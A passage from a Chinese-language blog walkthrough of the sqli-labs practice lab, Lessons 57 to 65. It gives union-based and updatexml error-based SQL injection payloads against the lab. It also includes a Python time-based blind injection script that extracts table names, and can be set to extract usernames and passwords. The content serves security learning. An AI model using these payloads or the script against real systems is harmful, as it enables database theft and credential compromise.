+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1" union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">3</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-58"><a href="#Lesson-58" class="headerlink" title="Lesson 58"></a>Lesson 58</h2><p>注入次数限制变成了5次。GET 传值，单引号闭合。报错注入。<br>payload:</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id='and updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select group_concat(table_name) from information_schema.tables where table_schema=database()),<span class="number">0x7e</span>),<span class="number">1</span>) %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-59"><a href="#Lesson-59" class="headerlink" title="Lesson 59"></a>Lesson 59</h2><p>跟上题相同。GET 传值，无闭合，报错注入。<br>payload:</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="string">''</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0</span>x7e,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=database()),<span class="number">0</span>x7e),<span class="number">1</span>) %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-60"><a href="#Lesson-60" class="headerlink" title="Lesson 60"></a>Lesson 60</h2><p>跟上题相同。GET 传值，”) 闭合，报错注入。<br>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=") and updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>) %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-61"><a href="#Lesson-61" class="headerlink" title="Lesson 61"></a>Lesson 61</h2><p>跟上题相同。GET 传值，’)) 闭合，报错注入。<br>payload:</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=')) and updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select group_concat(table_name) from information_schema.tables where table_schema=database()),<span class="number">0x7e</span>),<span class="number">1</span>) %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-62"><a href="#Lesson-62" class="headerlink" title="Lesson 62"></a>Lesson 62</h2><p>注入次数限制为 130 次以下。采用时间盲注。GET 传值，’) 闭合。<br>payload:</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">import sys</span><br><span class="line">import <span class="built_in">time</span></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getPayload(result_index, char_index, ascii):</span><br><span class="line">    <span class="comment"># 系统表中数据</span></span><br><span class="line">    info_database_name = <span class="string">"information_schema"</span></span><br><span class="line">    info_table_name = <span class="string">"tables"</span>  <span class="comment"># schemata / tables / columns</span></span><br><span class="line">    info_column_name = <span class="string">"table_name"</span>  <span class="comment"># schema_name / table_name / column_name</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 注入表中数据</span></span><br><span class="line">    database_name = <span class="string">"security"</span></span><br><span class="line">    table_name = <span class="string">"users"</span></span><br><span class="line">    column_name = [<span class="string">"id"</span>, <span class="string">"username"</span>, <span class="string">"password"</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 连接select</span></span><br><span class="line">    where_str = <span class="string">" where table_schema=database()"</span></span><br><span class="line">    <span class="comment"># where_str = " where table_schema='"+database_name+"'"+" and table_name='"+table_name+"'"</span></span><br><span class="line">    select_str = <span class="string">"select "</span> + info_column_name + <span class="string">" from "</span> + info_database_name + <span class="string">"."</span> + info_table_name + where_str + <span class="string">" limit "</span> + str(</span><br><span class="line">        result_index) + <span class="string">",1"</span></span><br><span class="line">    <span class="comment"># select_str = "select concat_ws('-',"+column_name[0]+","+column_name[1]+","+column_name[2]+") from "+table_name+" limit "+str(result_index)+",1"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 连接payload</span></span><br><span class="line">    sqli_str = <span class="string">"if(ascii(mid(("</span> + select_str + <span class="string">"),"</span> + str(char_index) + <span class="string">",1))="</span> + str(ascii) + <span class="string">",sleep(0.2),0)"</span></span><br><span class="line">    payload = <span class="string">"?id=1 \')"</span> + <span class="string">" and "</span> + sqli_str + <span class="string">"%23"</span></span><br><span class="line">    <span class="literal">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def execute(result_index, char_index, ascii):</span><br><span class="line">    <span class="comment"># 连接url</span></span><br><span class="line">    url = <span class="string">"http://localhost:81/SQLI-LABS/sqli-labs-master/Less-62/index.php"</span></span><br><span class="line">    payload = getPayload(result_index, char_index, ascii)</span><br><span class="line">    <span class="comment"># print(payload)</span></span><br><span class="line">    <span class="comment"># 检查延时</span></span><br><span class="line">    before_time = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line">    url = url + payload</span><br><span class="line">    response = requests.<span class="built_in">get</span>(url)</span><br><span class="line">    print(response.<span class="keyword">text</span>)</span><br><span class="line">    after_time = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line">    use_time = after_time - before_time</span><br><span class="line">    <span class="keyword">if</span> use_time &gt; <span class="number">0.1</span>:</span><br><span class="line">        <span class="literal">return</span> True</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="literal">return</span> False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exhaustive(result_index, char_index):</span><br><span class="line">    <span class="comment"># ascii可显字符从32到126共95个 按可能性顺序</span></span><br><span class="line">    ascii_list = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'g'</span>, <span class="string">'h'</span>, <span class="string">'i'</span>, <span class="string">'j'</span>, <span class="string">'k'</span>, <span class="string">'l'</span>, <span class="string">'m'</span>, <span class="string">'n'</span>, <span class="string">'o'</span>, <span class="string">'p'</span>, <span class="string">'q'</span>, <span class="string">'r'</span>, <span class="string">'s'</span>, <span class="string">'t'</span>,</span><br><span class="line">                  <span class="string">'u'</span>, <span class="string">'v'</span>, <span class="string">'w'</span>, <span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>, <span class="string">'_'</span>, <span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>, <span class="string">'F'</span>, <span class="string">'G'</span>, <span class="string">'H'</span>, <span class="string">'I'</span>, <span class="string">'J'</span>, <span class="string">'K'</span>, <span class="string">'L'</span>, <span class="string">'M'</span>,</span><br><span class="line">                  <span class="string">'N'</span>, <span class="string">'O'</span>, <span class="string">'P'</span>, <span class="string">'Q'</span>, <span class="string">'R'</span>, <span class="string">'S'</span>, <span class="string">'T'</span>, <span class="string">'U'</span>, <span class="string">'V'</span>, <span class="string">'W'</span>, <span class="string">'X'</span>, <span class="string">'Y'</span>, <span class="string">'Z'</span>, <span class="string">' '</span>, <span class="string">'!'</span>, <span class="string">'"'</span>, <span class="string">'#'</span>, <span class="string">'$'</span>, <span class="string">'%'</span>, <span class="string">'&amp;'</span>,</span><br><span class="line">                  <span class="string">'\''</span>, <span class="string">'('</span>, <span class="string">')'</span>, <span class="string">'*'</span>, <span class="string">'+'</span>, <span class="string">','</span>, <span class="string">'-'</span>, <span class="string">'.'</span>, <span class="string">'/'</span>, <span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">':'</span>,</span><br><span class="line">                  <span class="string">';'</span>, <span class="string">'&lt;'</span>, <span class="string">'='</span>, <span class="string">'&gt;'</span>, <span class="string">'?'</span>, <span class="string">'@'</span>, <span class="string">'['</span>, <span class="string">'\\'</span>, <span class="string">']'</span>, <span class="string">'^'</span>, <span class="string">'`'</span>, <span class="string">'&#123;'</span>, <span class="string">'|'</span>, <span class="string">'&#125;'</span>, <span class="string">'~'</span>]</span><br><span class="line">    <span class="keyword">for</span> ascii_char <span class="keyword">in</span> ascii_list:</span><br><span class="line">        ascii = ord(ascii_char)</span><br><span class="line">        <span class="keyword">if</span> execute(str(result_index), str(char_index + <span class="number">1</span>), str(ascii)):</span><br><span class="line">            <span class="literal">return</span> ascii_char</span><br><span class="line">    <span class="literal">return</span> chr(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">num</span> <span class="keyword">in</span> range(<span class="number">32</span>):  <span class="comment"># 查询结果的数量</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">len</span> <span class="keyword">in</span> range(<span class="number">32</span>):  <span class="comment"># 单条查询结果的长度</span></span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">char</span> = exhaustive(<span class="built_in">num</span>, <span class="built_in">len</span>)</span><br><span class="line">            <span class="keyword">if</span> ord(<span class="keyword">char</span>) == <span class="number">1</span>:  <span class="comment"># 单条查询结果已被遍历</span></span><br><span class="line">                break</span><br><span class="line">            sys.<span class="keyword">stdout</span>.<span class="built_in">write</span>(<span class="keyword">char</span>)</span><br><span class="line">            sys.<span class="keyword">stdout</span>.flush()</span><br><span class="line">        <span class="keyword">if</span> count == <span class="number">1</span>:  <span class="comment"># 查询结果已被遍历</span></span><br><span class="line">            break</span><br><span class="line">        sys.<span class="keyword">stdout</span>.<span class="built_in">write</span>(<span class="string">"\r\n"</span>)</span><br><span class="line">        sys.<span class="keyword">stdout</span>.flush()</span><br></pre></td></tr></table></figure>
+
+<p>时间盲注只能使用 python 脚本进行。因为时间盲注所使用次数必定大于130，使用 python 脚本可以在短时间内进行多次访问，不至于 redirect 使得数据库表名等信息被刷新。</p>
+<p>报错注入不可行。 </p>
+<h2 id="Lesson-63"><a href="#Lesson-63" class="headerlink" title="Lesson 63"></a>Lesson 63</h2><p>跟上一题相同，唯一不同之处在使用的是单引号闭合，GET 传值，时间盲注。payload 和上一题基本相同，不在挂上来了。</p>
+<h2 id="Lesson-64"><a href="#Lesson-64" class="headerlink" title="Lesson 64"></a>Lesson 64</h2><p>跟上一题相同，唯一不同之处在使用的是 )) 闭合，GET 传值，时间盲注。payload 和 Lesson 62 基本相同。</p>
+<h2 id="Lesson-65"><a href="#Lesson-65" class="headerlink" title="Lesson 65"></a>Lesson 65</h2><p>跟上一题相同，唯一不同之处在使用的是单括号闭合，GET 传值，时间盲注。payload 和 Lesson 62 基本相同。</p>
+<p>结束。</p>
+
+                            <hr>
+                        </div>
+                        <br>
+                        <div>
+                            
+                            <p>
+                                <i class="iconfont icon-tag"></i>
+                                
+                                    <a class="hover-with-bg" href="/tags/SQL">SQL</a>
+                                
+                            </p>
+                            
+                                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+                            
+                        </div>
+                    </div>
+                </div>
+            </div>
+        <div class="d-none d-lg-block col-lg-2 toc-container">
+            
+  <div id="toc">
+    <p class="h4"><i class="far fa-list-alt"></i> Toc:</p> 
+    <div id="tocbot"></div>
+  </div>
+
+        </div>
+    </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+    <div class="container comments mx-auto" id="comments">
+        
+    </div>
+</div>
+    
+</main>
+
+<footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/0x2e/Material-T" target="_blank" rel="nofollow noopener"> <b>Material-T</b></a>
+    <br>
+    
+  </div>
+</footer>
+
+  <!-- SCRIPTS -->
+  <script src="/lib/mdbootstrap/js/jquery-3.4.1.min.js"></script>
+  <script src="/lib/mdbootstrap/js/popper.min.js"></script>
+  <script src="/lib/mdbootstrap/js/bootstrap.min.js?v=4.3.1"></script>
+  <script src="/lib/mdbootstrap/js/mdb.min.js?v=4.8.7"></script>
+  <script src="/lib/nprogress/nprogress.min.js?v=0.2.0"></script>
+  <script src="/js/main.js"></script>
+  
+    
+      <script src="/lib/tocbot/tocbot.min.js?v=4.7.0"></script>
+    
+    <script src="/js/post.js"></script>
+  
+  
+    <script src="/lib/prettify/prettify.min.js?v=0.1.0"></script>
+    <script>
+      $(document).ready(function(){
+        $('pre').addClass('prettyprint linenums');
+        prettyPrint();
+      })
+    </script>
+  
+  
+    <script src="/lib/typed/typed.min.js?v=2.0.9"></script>
+    <script>
+        var typed = new Typed('#subtitle', {
+          strings: [
+            '  ',
+            "Sqli_Lab_Learning&nbsp;",
+        ],
+        cursorChar: ">",
+        typeSpeed: 90,
+        startDelay: 300, //开始之前延迟300毫秒
+        loop: false,
+        });
+        $(".typed-cursor").addClass("h2");
+    </script>
+  
+  
+    <script src="/lib/anchor/anchor.min.js?v=4.2.0"></script>
+    <script>
+      anchors.options = {
+        placement: "right",
+        visible: "false",
+        
+      };
+      anchors.add(".post-content > h1,h2,h3,h4,h5,h6");
+    </script>
+  
+</body>
+</html>
